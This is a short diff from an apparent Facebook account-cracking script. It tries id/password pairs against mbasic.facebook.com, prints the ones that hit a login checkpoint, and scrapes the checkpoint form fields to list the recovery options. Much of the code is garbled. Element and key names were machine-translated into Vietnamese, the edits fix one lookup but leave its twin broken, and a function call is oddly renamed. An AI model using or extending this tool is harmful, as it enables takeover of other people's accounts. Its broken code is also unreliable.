@@ -72,7 +72,7 @@ def login():
 				sy3 = json.loads(sy.text)['id']
 				menu(sy2,sy3)
 			except KeyError:
-				login_lagi()
+				login_lagi334()
 			except requests.exceptions.ConnectionError:
 				banner()
 				li = '# VẤN ĐỀ KẾT NỐI INTERNET, KIỂM TRA VÀ THỬ LẠI'
@@ -828,13 +828,13 @@ def cek_opsi():
 					data = {}
 					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
 					for anj in jo('input'):
-						if anj.get('Tên') in lion:
+						if anj.get('login') in lion:
 							data.update({anj.get('Tên'):anj.get('value')})
 					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['hoạt động']), data=data, headers=header).text,'html.parser')
 					print('\r%s╰─── %s|%s ----> CP       %s'%(b,id,pw,x))
 					opsi = kent.find_all('tùy chọn')
 					if len(opsi)==0:
-						print('\r%s╰─── Nhấn Có / A2F (Kiểm tra Đăng nhập trong Lite / Cơ bản%s)'%(hh,x))
+						print('\r%s╰─── Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
 					else:
 						for opsii in opsi:
 							print('\r%s---> %s%s'%(kk,opsii.text,x))
